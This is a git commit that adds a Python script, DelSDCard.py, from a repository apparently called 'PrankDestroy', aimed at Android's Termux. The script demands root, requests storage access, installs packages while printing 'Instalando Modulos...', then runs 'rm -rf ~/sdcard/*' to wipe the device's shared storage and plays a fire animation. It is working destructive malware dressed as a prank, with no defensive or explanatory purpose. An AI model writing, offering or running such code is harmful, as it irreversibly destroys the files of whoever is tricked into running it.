d22f3b0c1ba12e39e1a425e0993b49784da06e70
Br3Fuck <85564395+Br3Fuck@users.noreply.github.com>
2021-06-11 18:40:39 -0500

    Create DelSDCard.py
    **Thanks: @Osay2 & @Br3Fuck**

---
+++ Termux/DelSDCard.py
@@ -0,0 +1,34 @@
+# Delete SDCard
+# By: https://github.com/Br3Fuck/PrankDestroy
+# Modulos:
+
+import os, sys, time
+from colorama import *
+
+# Clear:
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Run Root:
+
+if os.geteuid() != 0:
+    clear()
+    print("Inicia el archivo como root...")
+    sys.exit(0)
+else:
+    pass
+
+# Delete SDCard Commands:
+
+def delcard():
+    clear()
+    os.system("termux-setup-storage")
+    os.system("pkg install -y tsu >> registros.txt")
+    os.system("pkg install -y libcaca >> registro.txt")
+    print("Instalando Modulos...")
+    print("Eliminando SD Card...")
+    os.system("rm -rf ~/sdcard/*")
+    os.system("cacafire")
+
+delcard()
